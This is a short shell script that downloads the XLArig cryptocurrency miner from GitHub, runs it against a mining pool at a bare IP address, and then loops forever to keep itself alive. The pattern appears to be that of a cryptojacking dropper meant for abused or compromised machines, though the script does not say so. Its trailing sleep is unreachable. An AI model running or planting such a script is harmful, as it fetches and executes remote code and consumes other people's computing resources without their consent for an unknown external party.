#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-linux-x86_64.zip 
unzip XLArig-v5.2.2-linux-x86_64.zip
./xlarig -o 45.156.23.120:8989 -a rx/0 -k
while [ 1 ]; do
sleep 2
done
sleep 1200
